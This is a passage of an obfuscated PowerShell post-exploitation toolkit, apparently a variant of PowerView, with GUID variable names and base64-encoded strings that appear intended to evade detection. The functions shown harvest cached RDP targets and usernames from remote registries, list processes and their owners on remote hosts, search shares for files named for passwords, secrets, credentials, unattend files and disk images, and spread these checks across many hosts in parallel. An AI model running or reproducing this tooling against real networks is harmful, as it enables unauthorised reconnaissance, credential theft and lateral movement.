            ${e90163d6067a479d9ce734224dc75bc9} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
            ${43d13ff79b6143e7838149d02f176464}.GetStringValue(${fbcc9dfbc75b4d7c94acd3ef424a6e96}, ${5d6afadd83614764a6d3f69fb67ac9ee}, ${e90163d6067a479d9ce734224dc75bc9}).sValue
        }
        catch {
            Write-Warning "[!] Error opening remote registry on ${c096522c7bbe4c7aaadf99843e3b09fb}. Remote registry likely not enabled."
            $Null
        }
    }
}
function Get-CachedRDPConnection {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = "localhost",
        [String]
        ${aa4e10a6a5fe4cc19679c3039fa02e52},
        [String]
        ${a3f847eaa4054bfaa0b1a0725f444c0d}
    )
    begin {
        if (${aa4e10a6a5fe4cc19679c3039fa02e52} -and ${a3f847eaa4054bfaa0b1a0725f444c0d}) {
            ${aef4c3d20eff433590ff1b79e30c060b} = ${a3f847eaa4054bfaa0b1a0725f444c0d} | ConvertTo-SecureString -AsPlainText -Force
            ${a6f9764977ce40faa20533a56574a78b} = New-Object System.Management.Automation.PSCredential(${aa4e10a6a5fe4cc19679c3039fa02e52},${aef4c3d20eff433590ff1b79e30c060b})
        }
        ${dab08b59348f473aa191b13b5203b971} = 2147483651
    }
    process {
        try {
            if(${a6f9764977ce40faa20533a56574a78b}) {
                ${43d13ff79b6143e7838149d02f176464} = Get-Wmiobject -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername ${c096522c7bbe4c7aaadf99843e3b09fb} -Credential ${a6f9764977ce40faa20533a56574a78b} -ErrorAction SilentlyContinue
            }
            else {
                ${43d13ff79b6143e7838149d02f176464} = Get-Wmiobject -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername ${c096522c7bbe4c7aaadf99843e3b09fb} -ErrorAction SilentlyContinue
            }
        }
        catch {
            Write-Warning "Error accessing ${c096522c7bbe4c7aaadf99843e3b09fb}, likely insufficient permissions or firewall rules on host"
        }
        if(!${43d13ff79b6143e7838149d02f176464}) {
            Write-Warning "Error accessing ${c096522c7bbe4c7aaadf99843e3b09fb}, likely insufficient permissions or firewall rules on host"
        }
        else {
            ${64ea0a5d081e4c82883c0b84d4996c38} = (${43d13ff79b6143e7838149d02f176464}.EnumKey(${dab08b59348f473aa191b13b5203b971}, "")).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
            foreach (${1766b0e2ff5040fbb40789f9fe172f75} in ${64ea0a5d081e4c82883c0b84d4996c38}) {
                try {
                    ${dfa85e24773f431f91e73de068d7b94e} = Convert-SidToName ${1766b0e2ff5040fbb40789f9fe172f75}
                    ${ee9c74ba32c047538d1875d58e8e0bbe} = ${43d13ff79b6143e7838149d02f176464}.EnumValues(${dab08b59348f473aa191b13b5203b971},"${1766b0e2ff5040fbb40789f9fe172f75}\Software\Microsoft\Terminal Server Client\Default").sNames
                    foreach ($Connection in ${ee9c74ba32c047538d1875d58e8e0bbe}) {
                        if($Connection -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBSAFUALgAqAA==')))) {
                            ${da7be972f7e44ec9875f40715ba00f6d} = ${43d13ff79b6143e7838149d02f176464}.GetStringValue(${dab08b59348f473aa191b13b5203b971}, "${1766b0e2ff5040fbb40789f9fe172f75}\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue
                            ${3e59fd3fe1a2462986189273f45f5993} = New-Object PSObject
                            ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                            ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${dfa85e24773f431f91e73de068d7b94e}
                            ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${1766b0e2ff5040fbb40789f9fe172f75}
                            ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) ${da7be972f7e44ec9875f40715ba00f6d}
                            ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                            ${3e59fd3fe1a2462986189273f45f5993}
                        }
                    }
                    ${bc4ddd13d90541eeacf55a463fe0124f} = ${43d13ff79b6143e7838149d02f176464}.EnumKey(${dab08b59348f473aa191b13b5203b971},"${1766b0e2ff5040fbb40789f9fe172f75}\Software\Microsoft\Terminal Server Client\Servers").sNames
                    foreach ($Server in ${bc4ddd13d90541eeacf55a463fe0124f}) {
                        ${d2aaa9bbbac24713b6806f92f58e0057} = ${43d13ff79b6143e7838149d02f176464}.GetStringValue(${dab08b59348f473aa191b13b5203b971}, "${1766b0e2ff5040fbb40789f9fe172f75}\Software\Microsoft\Terminal Server Client\Servers\$Server", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                        ${3e59fd3fe1a2462986189273f45f5993} = New-Object PSObject
                        ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                        ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${dfa85e24773f431f91e73de068d7b94e}
                        ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${1766b0e2ff5040fbb40789f9fe172f75}
                        ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $Server
                        ${3e59fd3fe1a2462986189273f45f5993} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) ${d2aaa9bbbac24713b6806f92f58e0057}
                        ${3e59fd3fe1a2462986189273f45f5993}   
                    }
                }
                catch {
                    Write-Debug "Error: $_"
                }
            }
        }
    }
}
function Get-NetProcess {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [String]
        ${aa4e10a6a5fe4cc19679c3039fa02e52},
        [String]
        ${a3f847eaa4054bfaa0b1a0725f444c0d}
    )
    process {
        if(${c096522c7bbe4c7aaadf99843e3b09fb}) {
            ${c096522c7bbe4c7aaadf99843e3b09fb} = Get-NameField -b2929ecf6cd74a84bce9ccd2f5622fbb ${c096522c7bbe4c7aaadf99843e3b09fb}          
        }
        else {
            ${c096522c7bbe4c7aaadf99843e3b09fb} = [System.Net.Dns]::GetHostName()
        }
        ${a6f9764977ce40faa20533a56574a78b} = $Null
        if(${aa4e10a6a5fe4cc19679c3039fa02e52}) {
            if(${a3f847eaa4054bfaa0b1a0725f444c0d}) {
                ${aef4c3d20eff433590ff1b79e30c060b} = ${a3f847eaa4054bfaa0b1a0725f444c0d} | ConvertTo-SecureString -AsPlainText -Force
                ${a6f9764977ce40faa20533a56574a78b} = New-Object System.Management.Automation.PSCredential(${aa4e10a6a5fe4cc19679c3039fa02e52},${aef4c3d20eff433590ff1b79e30c060b})
                try {
                    Get-WMIobject -Class Win32_process -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -Credential ${a6f9764977ce40faa20533a56574a78b} | % {
                        ${fc601ecc1a7c4496aec7f303c83dca21} = $_.getowner();
                        ${2d67a11c9caf46c08e634e718a0a2f46} = New-Object PSObject
                        ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                        ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                        ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                        ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) ${fc601ecc1a7c4496aec7f303c83dca21}.Domain
                        ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) ${fc601ecc1a7c4496aec7f303c83dca21}.User
                        ${2d67a11c9caf46c08e634e718a0a2f46}
                    }
                }
                catch {
                    Write-Verbose "[!] Error enumerating remote processes, access likely denied: $_"
                }
            }
            else {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABSAGUAbQBvAHQAZQBQAGEAcwBzAHcAbwByAGQAIABtAHUAcwB0ACAAYQBsAHMAbwAgAGIAZQAgAHMAdQBwAHAAbABpAGUAZAAhAA==')))
            }
        }
        else {
            try {
                Get-WMIobject -Class Win32_process -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} | % {
                    ${fc601ecc1a7c4496aec7f303c83dca21} = $_.getowner();
                    ${2d67a11c9caf46c08e634e718a0a2f46} = New-Object PSObject
                    ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                    ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                    ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                    ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) ${fc601ecc1a7c4496aec7f303c83dca21}.Domain
                    ${2d67a11c9caf46c08e634e718a0a2f46} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) ${fc601ecc1a7c4496aec7f303c83dca21}.User
                    ${2d67a11c9caf46c08e634e718a0a2f46}
                }
            }
            catch {
                Write-Verbose "[!] Error enumerating remote processes, access likely denied: $_"
            }
        }
    }
}
function Find-InterestingFile {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${efe450d53b084f3cb286d6a758f6ee94} = '.\',
        [String[]]
        ${a182f316ca27474f82b6fcb2ec2aac3c},
        [Switch]
        ${e5afd82ef21d416c91bc672d94d9a83c},
        [Switch]
        ${b6f0f66e35a747f0a8ca9060421541af},
        [String]
        ${b5e988a72dd1462eaa092c8c929e58f5},
        [String]
        ${c544349465b54e9c91c2485eb6d68658},
        [String]
        ${d11a218100f44535a0147acbe501fa44},
        [Switch]
        ${a21d3b23633f47f8bc07461d561a6f3d},
        [Switch]
        ${d721ac1d513f48189e0eb86d94c61266},
        [Switch]
        ${ddf4152de99f47b5818c689d1c2bd9de},
        [String]
        ${a3653a86a8bf4a758cfe5d1942c0bcde},
        [Switch]
        ${d304e44efca5442daf28ae2e0a813411},
        [System.Management.Automation.PSCredential]
        ${a6f9764977ce40faa20533a56574a78b} = [System.Management.Automation.PSCredential]::Empty
    )
    begin {
        ${4459bb8dedb44c1e893177515bfcdf8b} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHMAcwA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAG4AcwBpAHQAaQB2AGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAaQBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGMAcgBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB2AG0AZABrAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAZABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAZABlAG4AdABpAGEAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBjAG8AbgBmAGkAZwA='))))
        if(!${efe450d53b084f3cb286d6a758f6ee94}.EndsWith('\')) {
            ${efe450d53b084f3cb286d6a758f6ee94} = ${efe450d53b084f3cb286d6a758f6ee94} + '\'
        }
        if(${a6f9764977ce40faa20533a56574a78b} -ne [System.Management.Automation.PSCredential]::Empty) { ${d304e44efca5442daf28ae2e0a813411} = $True }
        if (${a182f316ca27474f82b6fcb2ec2aac3c}) {
            if(${a182f316ca27474f82b6fcb2ec2aac3c} -isnot [system.array]) {
                ${a182f316ca27474f82b6fcb2ec2aac3c} = @(${a182f316ca27474f82b6fcb2ec2aac3c})
            }
            ${4459bb8dedb44c1e893177515bfcdf8b} = ${a182f316ca27474f82b6fcb2ec2aac3c}
        }
        if(-not ${4459bb8dedb44c1e893177515bfcdf8b}[0].startswith("*")) {
            for (${df57982c23a24d73a2eb69bf47d8ac30} = 0; ${df57982c23a24d73a2eb69bf47d8ac30} -lt ${4459bb8dedb44c1e893177515bfcdf8b}.Count; ${df57982c23a24d73a2eb69bf47d8ac30}++) {
                ${4459bb8dedb44c1e893177515bfcdf8b}[${df57982c23a24d73a2eb69bf47d8ac30}] = "*$(${4459bb8dedb44c1e893177515bfcdf8b}[${df57982c23a24d73a2eb69bf47d8ac30}])*"
            }
        }
        if (${e5afd82ef21d416c91bc672d94d9a83c}) {
            ${4459bb8dedb44c1e893177515bfcdf8b} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        if(${b6f0f66e35a747f0a8ca9060421541af}) {
            ${b5e988a72dd1462eaa092c8c929e58f5} = (get-date).AddDays(-7).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            ${4459bb8dedb44c1e893177515bfcdf8b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA==')))
        }
        if(${d304e44efca5442daf28ae2e0a813411}) {
            ${076e36dda7734263a96704324ac1ecf0} = ${efe450d53b084f3cb286d6a758f6ee94}.split('\')
            ${7ef53f6d6c9446179cf68f433af42de1} = ${076e36dda7734263a96704324ac1ecf0}[0..(${076e36dda7734263a96704324ac1ecf0}.length-2)] -join '\'
            ${c2d0346f3c5149d2996b8185fb799893} = ${076e36dda7734263a96704324ac1ecf0}[-1]
            ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose "Mounting path ${efe450d53b084f3cb286d6a758f6ee94} using a temp PSDrive at ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}"
            try {
                $Null = ndr -Name ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} -Credential ${a6f9764977ce40faa20533a56574a78b} -PSProvider FileSystem -Root ${7ef53f6d6c9446179cf68f433af42de1} -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path ${efe450d53b084f3cb286d6a758f6ee94} : $_"
                return $Null
            }
            ${efe450d53b084f3cb286d6a758f6ee94} = ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} + ":\" + ${c2d0346f3c5149d2996b8185fb799893}
        }
    }
    process {
        Write-Verbose "[*] Search path ${efe450d53b084f3cb286d6a758f6ee94}"
        function Invoke-CheckWrite {
            [CmdletBinding()]param([String]${efe450d53b084f3cb286d6a758f6ee94})
            try {
                ${b3bdb30cc09d497ebf8e8927d837c479} = [IO.FILE]::OpenWrite(${efe450d53b084f3cb286d6a758f6ee94})
                ${b3bdb30cc09d497ebf8e8927d837c479}.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }
        ${0b117cfeac8d42ce884fde1c0675bb21} =  @{
            'Path' = ${efe450d53b084f3cb286d6a758f6ee94}
            'Recurse' = $True
            'Force' = $(-not ${d721ac1d513f48189e0eb86d94c61266})
            'Include' = ${4459bb8dedb44c1e893177515bfcdf8b}
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
        }
        ls @0b117cfeac8d42ce884fde1c0675bb21 | % {
            Write-Verbose $_
            if(!${a21d3b23633f47f8bc07461d561a6f3d} -or !$_.PSIsContainer) {$_}
        } | % {
            if(${b5e988a72dd1462eaa092c8c929e58f5} -or ${c544349465b54e9c91c2485eb6d68658} -or ${d11a218100f44535a0147acbe501fa44}) {
                if(${b5e988a72dd1462eaa092c8c929e58f5} -and ($_.LastAccessTime -gt ${b5e988a72dd1462eaa092c8c929e58f5})) {$_}
                elseif(${c544349465b54e9c91c2485eb6d68658} -and ($_.LastWriteTime -gt ${c544349465b54e9c91c2485eb6d68658})) {$_}
                elseif(${d11a218100f44535a0147acbe501fa44} -and ($_.CreationTime -gt ${d11a218100f44535a0147acbe501fa44})) {$_}
            }
            else {$_}
        } | % {
            if((-not ${ddf4152de99f47b5818c689d1c2bd9de}) -or (Invoke-CheckWrite -efe450d53b084f3cb286d6a758f6ee94 $_.FullName)) {$_}
        } | select FullName,@{Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')));Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | % {
            if(${a3653a86a8bf4a758cfe5d1942c0bcde}) {Export-PowerViewCSV -b67942bb466d4bb2ae35b61842d8002f $_ -a3653a86a8bf4a758cfe5d1942c0bcde ${a3653a86a8bf4a758cfe5d1942c0bcde}}
            else {$_}
        }
    }
    end {
        if(${d304e44efca5442daf28ae2e0a813411} -and ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}) {
            Write-Verbose "Removing temp PSDrive ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c}"
            gdr -Name ${ca9a5f19a00e4ab1ab65d8bc5cb6cd4c} -ErrorAction SilentlyContinue | rdr
        }
    }
}
function Invoke-ThreadedFunction {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        ${ba541df15a284a3187207310217a6e04},
        [Parameter(Position=2)]
        [Hashtable]
        ${eeeefbd7f1ac43118ed9ac4a4cb9dd01},
        [Int]
        ${af65be9c26e74dca807a99d4facf1a11} = 20,
        [Switch]
        ${e0be29f777aa4bc98faa14015f17190f}
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        Write-Verbose "[*] Total number of hosts: $(${c096522c7bbe4c7aaadf99843e3b09fb}.count)"
        ${d45b8d864616400c85e46a3f62465c48} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        ${d45b8d864616400c85e46a3f62465c48}.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        if(!${e0be29f777aa4bc98faa14015f17190f}) {
            ${a25ec3b9f92f4098ab8215082e9d9624} = gv -Scope 2
            ${51011d92ab1f428f97d69f82ca5392ba} = @("?",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFUASQBDAHUAbAB0AHUAcgBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))))
            ForEach($Var in ${a25ec3b9f92f4098ab8215082e9d9624}) {
                if(${51011d92ab1f428f97d69f82ca5392ba} -NotContains $Var.Name) {
                ${d45b8d864616400c85e46a3f62465c48}.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach($Function in (ls Function:)) {
                ${d45b8d864616400c85e46a3f62465c48}.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }
        ${c299401952124696bc03c96496906578} = [runspacefactory]::CreateRunspacePool(1, ${af65be9c26e74dca807a99d4facf1a11}, ${d45b8d864616400c85e46a3f62465c48}, $Host)
        ${c299401952124696bc03c96496906578}.Open()
        ${2fa99fb7e9e54d3c9369349abd41bd21} = @()
        ${545f21adf3dd4446ae88a7522b7e07fb} = @()
        ${5c62b576a8984351aa5b234e9e19a46f} = @()
        ${6a1d2d10aeb941458787cbe1335cc6ce} = 0
    }
    process {
        ForEach (${5c10572590774a67ad57cb4f99935a3e} in ${c096522c7bbe4c7aaadf99843e3b09fb}) {
            if (${5c10572590774a67ad57cb4f99935a3e} -ne '') {
                While ($(${c299401952124696bc03c96496906578}.GetAvailableRunspaces()) -le 0) {
                    sleep -MilliSeconds 500
                }
                ${545f21adf3dd4446ae88a7522b7e07fb} += [powershell]::create()
                ${545f21adf3dd4446ae88a7522b7e07fb}[${6a1d2d10aeb941458787cbe1335cc6ce}].runspacepool = ${c299401952124696bc03c96496906578}
                $Null = ${545f21adf3dd4446ae88a7522b7e07fb}[${6a1d2d10aeb941458787cbe1335cc6ce}].AddScript(${ba541df15a284a3187207310217a6e04}).AddParameter($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), ${5c10572590774a67ad57cb4f99935a3e})
                if(${eeeefbd7f1ac43118ed9ac4a4cb9dd01}) {
                    ForEach ($Param in ${eeeefbd7f1ac43118ed9ac4a4cb9dd01}.GetEnumerator()) {
                        $Null = ${545f21adf3dd4446ae88a7522b7e07fb}[${6a1d2d10aeb941458787cbe1335cc6ce}].AddParameter($Param.Name, $Param.Value)
                    }
                }
                ${2fa99fb7e9e54d3c9369349abd41bd21} += ${545f21adf3dd4446ae88a7522b7e07fb}[${6a1d2d10aeb941458787cbe1335cc6ce}].BeginInvoke();
                ${5c62b576a8984351aa5b234e9e19a46f} += ${2fa99fb7e9e54d3c9369349abd41bd21}[${6a1d2d10aeb941458787cbe1335cc6ce}].AsyncWaitHandle
            }
            ${6a1d2d10aeb941458787cbe1335cc6ce} = ${6a1d2d10aeb941458787cbe1335cc6ce} + 1
        }
    }
    end {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAGkAdABpAG4AZwAgAGYAbwByACAAcwBjAGEAbgBuAGkAbgBnACAAdABoAHIAZQBhAGQAcwAgAHQAbwAgAGYAaQBuAGkAcwBoAC4ALgAuAA==')))
        ${06dfcf54e88742bf89a3bf19e4188401} = Get-Date
        while ($(${2fa99fb7e9e54d3c9369349abd41bd21} | ? {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - ${06dfcf54e88742bf89a3bf19e4188401}).totalSeconds) -gt 60) {
                sleep -MilliSeconds 500
            }
        for (${54f0f90d304b49e0b0a156b6e8abba98} = 0; ${54f0f90d304b49e0b0a156b6e8abba98} -lt ${6a1d2d10aeb941458787cbe1335cc6ce}; ${54f0f90d304b49e0b0a156b6e8abba98}++) {
            try {
